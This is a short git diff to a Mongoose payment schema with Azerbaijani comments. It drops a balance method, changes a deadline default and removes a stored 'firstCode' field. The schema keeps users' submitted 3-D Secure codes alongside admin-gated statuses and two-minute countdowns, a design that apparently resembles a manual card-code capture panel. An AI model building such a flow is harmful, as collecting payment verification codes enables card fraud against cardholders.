@@ -6,7 +6,7 @@ const paymentSchema = new mongoose.Schema({
   order: { type: mongoose.Schema.Types.ObjectId, ref: 'Order', default: null, index: true },
   user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
   amount: { type: Number, required: true },
-  method: { type: String, enum: ['card', 'balance'], default: 'card', index: true },
+  method: { type: String, enum: ['card'], default: 'card', index: true },
   status: {
     type: String,
     enum: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final', 'approved', 'declined', 'refunded'],
@@ -23,7 +23,7 @@ const paymentSchema = new mongoose.Schema({
   },
 
   /* Hər mərhələdə ekranda göstərilən 2 dəqiqəlik geri sayımın bitmə vaxtı */
-  stageDeadline: { type: Date },
+  stageDeadline: { type: Date, default: null },
   stageStartedAt: { type: Date },
   wrongCodeAt: { type: Date },
   rejectionCount: { type: Number, default: 0 },
@@ -44,7 +44,6 @@ const paymentSchema = new mongoose.Schema({
   usingSavedCard: { type: Boolean, default: false }, /* Bu ödəniş saxlanılmış kart ilə edilibmi */
 
   /* 3-D Secure kodları */
-  firstCode: { type: String, default: '' },
   verificationCode: { type: String, default: '' },
   submittedCode: { type: String, default: '' },
   codeAttempts: [{
